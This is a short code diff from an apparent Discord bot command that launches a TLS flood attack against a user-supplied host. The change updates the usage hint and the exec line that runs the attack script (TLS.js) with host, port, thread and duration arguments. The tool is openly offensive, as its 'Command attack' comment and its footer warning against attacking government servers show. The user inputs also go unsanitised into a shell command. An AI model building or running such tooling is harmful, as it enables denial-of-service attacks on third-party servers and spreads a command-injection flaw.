@@ -17,7 +17,7 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`Ex ;tls https://akusygkmu.com 443 60`")
+	.setDescription("`Ex ;tls https://akusygkmu.com time threads`")
 	.setFooter("Please do not attack government server!")
 	message.channel.send(embed1);
 	return;
@@ -25,7 +25,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node tlsv.js ${host} ${port} ${duration}`, (error, stdout, stderr) => {
+exec(`node TLS.js ${host} ${port} 64 ${duration}`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
